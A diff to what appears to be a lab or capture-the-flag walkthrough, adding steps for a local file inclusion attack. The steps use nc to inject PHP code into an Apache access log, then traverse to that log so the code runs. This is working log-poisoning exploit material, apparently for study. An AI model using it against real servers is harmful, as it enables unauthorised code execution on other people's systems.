@@ -54,9 +54,16 @@
 
 * Redirect parameter is the same as view parameter which loads the new page.
 
+* Attempt to use the vuln. within the index.php:
+
+      nc 192.168.1.3 80  // press enter
+      GET /<? phpinfo(); ?>  // press enter
+
 * Attempt to traverse the directory for example:
       
       ../../../var/log/apache2/access_log
+      
+* There should be a display of the access log and below it should be the php info page.
 
 * With payload to execute commands:
 
